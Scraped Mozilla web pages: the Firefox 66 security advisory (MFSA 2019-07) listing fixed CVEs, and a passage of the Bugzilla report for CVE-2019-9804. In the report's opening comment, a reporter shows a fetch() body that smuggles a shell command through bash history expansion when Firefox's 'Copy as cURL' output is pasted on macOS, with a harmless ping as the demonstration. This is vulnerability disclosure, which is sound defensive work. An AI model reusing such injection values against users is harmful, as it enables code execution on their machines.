* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.mozilla.org_7557f121_20250120_232931.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-07

## Security vulnerabilities fixed in Firefox 66

Announced
March 19, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 66

#### [#CVE-2019-9790: Use-after-free when removing in-use DOM elements](#CVE-2019-9790)

Reporter
Brandon Wieser
Impact
critical
##### Description

A use-after-free vulnerability can occur when a raw pointer to a DOM element on a page is obtained using JavaScript and the element is then removed while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1525145](https://bugzilla.mozilla.org/show_bug.cgi?id=1525145)

#### [#CVE-2019-9791: Type inference is incorrect for constructors entered through on-stack replacement with IonMonkey](#CVE-2019-9791)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The type inference system allows the compilation of functions that can cause type confusions between arbitrary objects when compiled through the IonMonkey just-in-time (JIT) compiler and when the constructor function is entered through on-stack replacement (OSR). This allows for possible arbitrary reading and writing of objects during an exploitable crash.

##### References

* [Bug 1530958](https://bugzilla.mozilla.org/show_bug.cgi?id=1530958)

#### [#CVE-2019-9792: IonMonkey leaks JS\_OPTIMIZED\_OUT magic value to script](#CVE-2019-9792)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The IonMonkey just-in-time (JIT) compiler can leak an internal `JS_OPTIMIZED_OUT` magic value to the running script during a bailout. This magic value can then be used by JavaScript to achieve memory corruption, which results in a potentially exploitable crash.

##### References

* [Bug 1532599](https://bugzilla.mozilla.org/show_bug.cgi?id=1532599)

#### [#CVE-2019-9793: Improper bounds checks when Spectre mitigations are disabled](#CVE-2019-9793)

Reporter
Bruno Keith & Niklas Baumstark from the phoenhex team
Impact
high
##### Description

A mechanism was discovered that removes some bounds checking for string, array, or typed array accesses if Spectre mitigations have been disabled. This vulnerability could allow an attacker to create an arbitrary value in compiled JavaScript, for which the range analysis will infer a fully controlled, incorrect range in circumstances where users have explicitly disabled Spectre mitigations.
 *Note: Spectre mitigations are currently enabled for all users by default settings.*

##### References

* [Bug 1528829](https://bugzilla.mozilla.org/show_bug.cgi?id=1528829)

#### [#CVE-2019-9794: Command line arguments not discarded during execution](#CVE-2019-9794)

Reporter
Joshua Graham
Impact
high
##### Description

A vulnerability was discovered where specific command line arguments are not properly discarded during Firefox invocation as a shell handler for URLs. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default URI handler for a given URI scheme in third party applications and these applications insufficiently sanitize URL data.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1530103](https://bugzilla.mozilla.org/show_bug.cgi?id=1530103)

#### [#CVE-2019-9795: Type-confusion in IonMonkey JIT compiler](#CVE-2019-9795)

Reporter
Nils
Impact
high
##### Description

A vulnerability where type-confusion in the IonMonkey just-in-time (JIT) compiler could potentially be used by malicious JavaScript to trigger a potentially exploitable crash.

##### References

* [Bug 1514682](https://bugzilla.mozilla.org/show_bug.cgi?id=1514682)

#### [#CVE-2019-9796: Use-after-free with SMIL animation controller](#CVE-2019-9796)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when the SMIL animation controller incorrectly registers with the refresh driver twice when only a single registration is expected. When a registration is later freed with the removal of the animation controller element, the refresh driver incorrectly leaves a dangling pointer to the driver's observer array.

##### References

* [Bug 1531277](https://bugzilla.mozilla.org/show_bug.cgi?id=1531277)

#### [#CVE-2019-9797: Cross-origin theft of images with createImageBitmap](#CVE-2019-9797)

Reporter
AaylaSecura1138
Impact
high
##### Description

Cross-origin images can be read in violation of the same-origin policy by exporting an image after using `createImageBitmap` to read the image and then rendering the resulting bitmap image within a `canvas` element.

##### References

* [Bug 1528909](https://bugzilla.mozilla.org/show_bug.cgi?id=1528909)

#### [#CVE-2019-9798: Library is loaded from world writable APITRACE\_LIB location](#CVE-2019-9798)

Reporter
Jeff Gilbert
Impact
high
##### Description

On Android systems, Firefox can load a library from `APITRACE_LIB`, which is writable by all users and applications. This could allow malicious third party applications to execute a man-in-the-middle attack if a malicious code was written to that location and loaded.
 *Note: This issue only affects Android. Other operating systems are unaffected.*

##### References

* [Bug 1527534](https://bugzilla.mozilla.org/show_bug.cgi?id=1527534)

#### [#CVE-2019-9799: Information disclosure via IPC channel messages](#CVE-2019-9799)

Reporter
Paul Theriault
Impact
high
##### Description

Insufficient bounds checking of data during inter-process communication might allow a compromised content process to be able to read memory from the parent process under certain conditions.

##### References

* [Bug 1505678](https://bugzilla.mozilla.org/show_bug.cgi?id=1505678)

#### [#CVE-2019-9801: Windows programs that are not 'URL Handlers' are exposed to web content](#CVE-2019-9801)

Reporter
Daniel Veditz
Impact
moderate
##### Description

Firefox will accept any registered Program ID as an external protocol handler and offer to launch this local application when given a matching URL on Windows operating systems. This should only happen if the program has specifically registered itself as a "URL Handler" in the Windows registry.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1527717](https://bugzilla.mozilla.org/show_bug.cgi?id=1527717)

#### [#CVE-2019-9802: Chrome process information leak](#CVE-2019-9802)

Reporter
Stephen Fewer
Impact
moderate
##### Description

If a Sandbox content process is compromised, it can initiate an FTP download which will then use a child process to render the downloaded data. The downloaded data can then be passed to the Chrome process with an arbitrary file length supplied by an attacker, bypassing sandbox protections and allow for a potential memory read of adjacent data from the privileged Chrome process, which may include sensitive data.

##### References

* [Bug 1415508](https://bugzilla.mozilla.org/show_bug.cgi?id=1415508)

#### [#CVE-2019-9803: Upgrade-Insecure-Requests incorrectly enforced for same-origin navigation](#CVE-2019-9803)

Reporter
Xiaoyin Liu, Vinothkumar Nagasayanan
Impact
moderate
##### Description

The Upgrade-Insecure-Requests (UIR) specification states that if UIR is enabled through Content Security Policy (CSP), navigation to a same-origin URL must be upgraded to HTTPS. Firefox will incorrectly navigate to an HTTP URL rather than perform the security upgrade requested by the CSP in some circumstances, allowing for potential man-in-the-middle attacks on the linked resources.

##### References

* [Bug 1515863](https://bugzilla.mozilla.org/show_bug.cgi?id=1515863)
* [Bug 1437009](https://bugzilla.mozilla.org/show_bug.cgi?id=1437009)
* ['Upgrade Insecure Requests' specification](https://w3c.github.io/webappsec-upgrade-insecure-requests/)

#### [#CVE-2019-9804: Code execution through 'Copy as cURL' in Firefox Developer Tools on macOS](#CVE-2019-9804)

Reporter
potatoe
Impact
moderate
##### Description

In Firefox Developer Tools it is possible that pasting the result of the 'Copy as cURL' command into a command shell on macOS will cause the execution of unintended additional bash script commands if the URL was maliciously crafted. This is the result of an issue with the native version of Bash on macOS.
 *Note: This issue only affects macOS. Other operating systems are unaffected.*

##### References

* [Bug 1518026](https://bugzilla.mozilla.org/show_bug.cgi?id=1518026)

#### [#CVE-2019-9805: Potential use of uninitialized memory in Prio](#CVE-2019-9805)

Reporter
mlfbrown
Impact
moderate
##### Description

A latent vulnerability exists in the Prio library where data may be read from uninitialized memory for some functions, leading to potential memory corruption.

##### References

* [Bug 1521360](https://bugzilla.mozilla.org/show_bug.cgi?id=1521360)

#### [#CVE-2019-9806: Denial of service through successive FTP authorization prompts](#CVE-2019-9806)

Reporter
Hanno Böck, Anca Soncutean
Impact
low
##### Description

A vulnerability exists during authorization prompting for FTP transaction where successive modal prompts are displayed and cannot be immediately dismissed. This allows for a denial of service (DOS) attack.

##### References

* [Bug 1525267](https://bugzilla.mozilla.org/show_bug.cgi?id=1525267)

#### [#CVE-2019-9807: Text sent through FTP connection can be incorporated into alert messages](#CVE-2019-9807)

Reporter
Hanno Böck
Impact
low
##### Description

When arbitrary text is sent over an FTP connection and a page reload is initiated, it is possible to create a modal alert message with this text as the content. This could potentially be used for social engineering attacks.

##### References

* [Bug 1362050](https://bugzilla.mozilla.org/show_bug.cgi?id=1362050)

#### [#CVE-2019-9809: Denial of service through FTP modal alert error messages](#CVE-2019-9809)

Reporter
schattendeatroth, Hanno Böck
Impact
low
##### Description

If the source for resources on a page is through an FTP connection, it is possible to trigger a series of modal alert messages for these resources through invalid credentials or locations. These messages cannot be immediately dismissed, allowing for a denial of service (DOS) attack.

##### References

* [Bug 1282430](https://bugzilla.mozilla.org/show_bug.cgi?id=1282430)
* [Bug 1523249](https://bugzilla.mozilla.org/show_bug.cgi?id=1523249)

#### [#CVE-2019-9808: WebRTC permissions can display incorrect origin with data: and blob: URLs](#CVE-2019-9808)

Reporter
Jun Kokatsu
Impact
low
##### Description

If WebRTC permission is requested from documents with data: or blob: URLs, the permission notifications do not properly display the originating domain. The notification states "Unknown origin" as the requestee, leading to user confusion about which site is asking for this permission.

##### References

* [Bug 1434634](https://bugzilla.mozilla.org/show_bug.cgi?id=1434634)

#### [#CVE-2019-9789: Memory safety bugs fixed in Firefox 66](#CVE-2019-9789)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Dragana Damjanovic, Emilio Cobos Álvarez, Henri Sivonen, Narcis Beleuzu, Julian Seward, Marcia Knous, Gary Kwong, Tyson Smith, Yaron Tausky, Ronald Crane, and André Bargull reported memory safety bugs present in Firefox 65. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 66](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1520483%2C1522987%2C1528199%2C1519337%2C1525549%2C1516179%2C1518524%2C1518331%2C1526579%2C1512567%2C1524335%2C1448505%2C1518821)

#### [#CVE-2019-9788: Memory safety bugs fixed in Firefox 66 and Firefox ESR 60.6](#CVE-2019-9788)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Chun-Min Chang, Aral Yaman, Andreea Pavel, Jonathan Kew, Gary Kwong, Alex Gaynor, Masayuki Nakano, and Anne van Kesteren reported memory safety bugs present in Firefox 65 and Firefox ESR 60.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 66 and Firefox ESR 60.6](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1518001%2C1521304%2C1521214%2C1506665%2C1516834%2C1518774%2C1524755%2C1523362%2C1524214%2C1529203)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_4df27aba_20250120_232930.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1518026)
* [XML](/show_bug.cgi?ctype=xml&id=1518026)

Closed
[Bug 1518026](/show_bug.cgi?id=1518026)
(CVE-2019-9804)

Opened 6 years ago
Closed 6 years ago

# RCE via "copy as curl" on mac

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

RCE via "copy as curl" on mac

## Categories

### (DevTools :: Netmonitor, defect)

[Product:](/describecomponents.cgi?product=DevTools)

DevTools
▾

DevTools
For bugs in Firefox DevTools, the developer tools within the Firefox web browser. This includes issues about the user interface of the toolbox, special pages such as about:debugging and about:devtools, and developer-related APIs.
[See Open Bugs in This Product](/buglist.cgi?product=DevTools&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=DevTools)
Watch This Product

[Component:](/describecomponents.cgi?product=DevTools&component=Netmonitor#Netmonitor)

Netmonitor
▾

DevTools :: Netmonitor
The Netmonitor is the network logging feature in the Firefox Developer Tools.
[See Open Bugs in This Component](/buglist.cgi?product=DevTools&component=Netmonitor&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=DevTools&component=Netmonitor&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=DevTools&component=Netmonitor)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### (firefox-esr60 wontfix, firefox64 wontfix, firefox65 wontfix, firefox66 verified)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 66

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix) |
| firefox64 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox64&o1=equals&v1=wontfix) |
| firefox65 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=wontfix) |
| firefox66 | --- | [verified](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr60 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox64 |  | wontfix |
| firefox65 |  | wontfix |
| firefox66 |  | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: watashiwaher, Assigned: bgrins)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/5e699d95460c943a64c4ce3e96ff24fe?d=mm&size=40)  [bgrins](/user_profile?user_id=476442)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/31486f1d7d1564b70aa7496bbc6d8cd9?d=mm&size=40)  [watashiwaher](/user_profile?user_id=631135)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/34b251cf082c202fb3160b1afb810001?d=mm&size=40)  [Honza](/user_profile?user_id=303767)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2020-6811](/show_bug.cgi?id=1607742 "RESOLVED FIXED - 'Copy As Curl' in the network panel of the devtools does not escape the HTTP method properly, leading to local code execution")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=919356 "https://bugs.chromium.org/p/chromium/issues/detail?id=919356")

## Details

### (4 keywords, Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]][adv-main66+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2019-9804

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]][adv-main66+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a1903662_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | [in-testsuite](#c10 "6 years ago") | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | in-testsuite | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files)

| [curl.zip](/attachment.cgi?id=9034609)  [6 years ago](#c0)  [potatoe](/user_profile?user_id=631135)   7.43 MB, application/zip |  | [Details](/attachment.cgi?id=9034609&action=edit) |
| --- | --- | --- |
| [Bug 1518026 - Escape '!' to '\041' in posix strings ($'...');r=Honza](/attachment.cgi?id=9036477)  [6 years ago](#c7)  [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)   47 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9036477&action=edit) | [Review](/attachment.cgi?id=9036477) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1518026#c0)• 6 years ago |
|  | |

Attached file
[curl.zip](attachment.cgi?id=9034609)
— [Details](attachment.cgi?id=9034609&action=edit)

VULNERABILITY DETAILS
Copypasting of curl requests from Firefox can produce RCE in MacOS.
For example we have such JS code:
fetch('<https://google.com>', {'body':'\'!ls:q:gs|ls|;ping 8.8.8.8;|', method:'POST'})
If we will copy it as curl we will get such bash command:
curl '<https://google.com/>' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: \*/\*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\'!ls:q:gs|ls|;ping 8.8.8.8;|'
The interesting part is here:
$'\'!ls:q:gs|ls|;ping 8.8.8.8;|'
It is calling following command:
ping 8.8.8.8
But how?
